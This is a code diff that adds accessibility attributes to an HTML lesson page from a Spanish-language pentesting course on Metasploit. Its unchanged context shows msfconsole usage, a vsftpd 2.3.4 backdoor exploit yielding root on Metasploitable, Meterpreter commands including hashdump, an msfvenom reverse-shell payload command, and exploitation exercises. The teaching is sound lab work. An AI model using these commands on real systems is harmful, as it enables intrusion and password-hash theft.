@@ -13,8 +13,8 @@
     <link rel="stylesheet" href="../styles.css">
 </head>
 <body>
-    <div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
-    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+    <div class="bg-grid" aria-hidden="true"></div><div class="bg-glow bg-glow-1" aria-hidden="true"></div><div class="bg-glow bg-glow-2" aria-hidden="true"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
 
     <main class="lesson-page">
         <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 2</span><span>›</span><span>Lección 11</span></div>
@@ -70,7 +70,7 @@
         <div class="lesson-section" id="msfconsole">
             <h2>3. msfconsole: la consola principal</h2>
             <div class="lesson-terminal">
-                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Comandos básicos de msfconsole</span></div>
+                <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Comandos básicos de msfconsole</span></div>
                 <pre><code><span style="color:#00e676">$</span> msfconsole -q    <span style="color:#546e7a"># Iniciar sin banner (-q = quiet)</span>
 
 msf6 > <span style="color:#c792ea">search</span> vsftpd              <span style="color:#546e7a"># Buscar exploits</span>
@@ -96,7 +96,7 @@ msf6 > <span style="color:#c792ea">sessions -i 1</span>               <span styl
                 abre una shell de root en el puerto 6200. Metasploitable tiene esta versión.
             </p>
             <div class="lesson-terminal">
-                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Explotar vsftpd 2.3.4 paso a paso</span></div>
+                <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Explotar vsftpd 2.3.4 paso a paso</span></div>
                 <pre><code>msf6 > <span style="color:#c792ea">search</span> vsftpd
    0  exploit/unix/ftp/vsftpd_234_backdoor  <span style="color:#c3e88d">excellent</span>
 
@@ -136,7 +136,7 @@ uid=0(root) gid=0(root)
                 y ofrece un arsenal de comandos para post-explotación:
             </p>
             <div class="lesson-terminal">
-                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Comandos de Meterpreter</span></div>
+                <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Comandos de Meterpreter</span></div>
                 <pre><code>meterpreter > <span style="color:#c792ea">sysinfo</span>           <span style="color:#546e7a"># Info del sistema</span>
 meterpreter > <span style="color:#c792ea">getuid</span>            <span style="color:#546e7a"># Tu usuario actual</span>
 meterpreter > <span style="color:#c792ea">hashdump</span>          <span style="color:#546e7a"># Extraer hashes de contraseñas</span>
@@ -168,7 +168,7 @@ meterpreter > <span style="color:#c792ea">background</span>        <span style="
         <div class="lesson-section" id="msfvenom">
             <h2>7. msfvenom: generar payloads personalizados</h2>
             <div class="lesson-terminal">
-                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Generar payloads con msfvenom</span></div>
+                <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Generar payloads con msfvenom</span></div>
                 <pre><code><span style="color:#546e7a"># Reverse shell para Linux (ELF)</span>
 <span style="color:#00e676">$</span> msfvenom -p linux/x86/meterpreter/reverse_tcp \
     LHOST=10.0.2.5 LPORT=4444 -f elf -o shell.elf
@@ -194,7 +194,7 @@ msf6 > exploit
         <div class="lesson-section" id="practica">
             <h2>8. Práctica: explota Metasploitable</h2>
             <div class="lesson-terminal">
-                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Ejercicios</span></div>
+                <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Ejercicios</span></div>
                 <pre><code><span style="color:#546e7a"># 1. Explota vsftpd 2.3.4 (backdoor)</span>
 <span style="color:#546e7a"># 2. Explota Samba (exploit/multi/samba/usermap_script)</span>
 <span style="color:#546e7a"># 3. Explota Java RMI (exploit/multi/misc/java_rmi_server)</span>
